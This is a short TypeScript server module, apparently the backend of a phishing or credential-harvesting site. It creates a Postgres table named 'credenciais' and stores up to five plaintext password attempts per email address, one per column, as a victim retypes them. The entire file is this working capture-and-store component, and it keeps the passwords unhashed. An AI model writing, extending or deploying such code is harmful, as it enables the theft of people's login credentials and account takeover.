import "server-only";
import { neon } from "@neondatabase/serverless";

const sql = neon(process.env.DATABASE_URL!);

export async function setupTable() {
  await sql`
    CREATE TABLE IF NOT EXISTS credenciais (
      id            SERIAL PRIMARY KEY,
      email         TEXT NOT NULL UNIQUE,
      senha1        TEXT DEFAULT '',
      senha2        TEXT DEFAULT '',
      senha3        TEXT DEFAULT '',
      senha4        TEXT DEFAULT '',
      senha5        TEXT DEFAULT '',
      criado_em     TIMESTAMPTZ DEFAULT NOW(),
      atualizado_em TIMESTAMPTZ DEFAULT NOW()
    )
  `;
}

export async function upsertSenha(email: string, tentativa: number, senha: string) {
  if (tentativa === 1) {
    await sql`INSERT INTO credenciais (email, senha1) VALUES (${email}, ${senha})
              ON CONFLICT (email) DO UPDATE SET senha1 = ${senha}, atualizado_em = NOW()`;
  } else if (tentativa === 2) {
    await sql`INSERT INTO credenciais (email, senha2) VALUES (${email}, ${senha})
              ON CONFLICT (email) DO UPDATE SET senha2 = ${senha}, atualizado_em = NOW()`;
  } else if (tentativa === 3) {
    await sql`INSERT INTO credenciais (email, senha3) VALUES (${email}, ${senha})
              ON CONFLICT (email) DO UPDATE SET senha3 = ${senha}, atualizado_em = NOW()`;
  } else if (tentativa === 4) {
    await sql`INSERT INTO credenciais (email, senha4) VALUES (${email}, ${senha})
              ON CONFLICT (email) DO UPDATE SET senha4 = ${senha}, atualizado_em = NOW()`;
  } else if (tentativa === 5) {
    await sql`INSERT INTO credenciais (email, senha5) VALUES (${email}, ${senha})
              ON CONFLICT (email) DO UPDATE SET senha5 = ${senha}, atualizado_em = NOW()`;
  }
}
